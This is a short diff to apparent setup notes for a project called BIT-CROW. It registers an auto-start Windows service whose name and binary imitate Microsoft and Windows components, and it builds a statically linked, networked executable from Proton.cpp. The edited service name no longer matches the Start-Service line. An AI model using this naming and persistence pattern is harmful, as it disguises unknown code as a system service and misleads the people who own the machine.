@@ -1,7 +1,7 @@
 
 
-New-Service -Name "windows NT" -BinaryPathName "C:\Windows NT\Windows_NT.exe" -DisplayName "windows NT" -StartupType Automatic
-New-Service -Name "windows NT" -BinaryPathName "C:\Users\baa4ts\Documents\GitHub\BIT-CROW\source\Windows_NT.exe" -DisplayName "windows NT" -StartupType Automatic
+New-Service -Name "Microsoft NT" -BinaryPathName "C:\Windows NT\Microsoft.exe" -DisplayName "windows NT" -StartupType Automatic
+New-Service -Name "Microsoft NT" -BinaryPathName "C:\Users\baa4ts\Documents\GitHub\BIT-CROW\source\Microsoft.exe" -DisplayName "windows NT" -StartupType Automatic
 
 Start-Service -Name "windows NT"
 g++ -m32 -DCPPHTTPLIB_OPENSSL_SUPPORT -o Windows_NT.exe Proton.cpp -lssl -lcrypto -lws2_32 -lcrypt32 -static
